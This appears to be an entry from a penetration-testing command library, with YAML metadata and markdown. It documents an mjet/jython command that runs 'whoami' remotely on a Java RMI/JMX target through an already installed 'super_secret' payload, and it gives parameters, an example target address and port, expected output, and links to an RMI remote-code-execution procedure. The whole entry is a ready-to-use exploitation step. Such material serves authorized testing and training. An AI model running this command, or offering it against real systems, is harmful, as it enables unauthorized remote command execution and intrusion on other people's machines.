---
id: a72cc340-2f7e-49c9-a454-a0a9ee0ce252
name: mjet-execute-whoami-using-super-secret
type: command
executor: bash
data: jython mjet.py $_TARGET_IP $_TARGET_PORT command super_secret "whoami"
output: null
created_at: '2023-04-06T03:56:00.891041+00:00'
updated_at: '2023-04-06T03:56:00.909475+00:00'
platforms:
  - Linux
tags:
  - exploitation
  - rmi
  - discovery
verified: true
validated: true
---

# mjet-execute-whoami-using-super-secret

## Command

```bash
jython mjet.py $_TARGET_IP $_TARGET_PORT command super_secret "whoami"
```

## Description

Executes 'whoami' on the target via the mjet-installed super_secret payload to identify the current user.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | Target IP | Yes |
| $_TARGET_PORT | Port | Yes |
| command | Action | Yes |
| super_secret | Payload name | Yes |
| "whoami" | Fixed command | Yes |

## Examples

### Basic Usage

```bash
jython mjet.py 192.168.1.100 1099 command super_secret "whoami"
```

## Expected Output

e.g., "root" or "user" indicating the executing user.

## Related

- [[procedures/Exploit-Java-RMI-for-RCE-Using-Sjet-or-Mjet]]
- [[commands/mjet-install-super-secret-payload-on-target]]
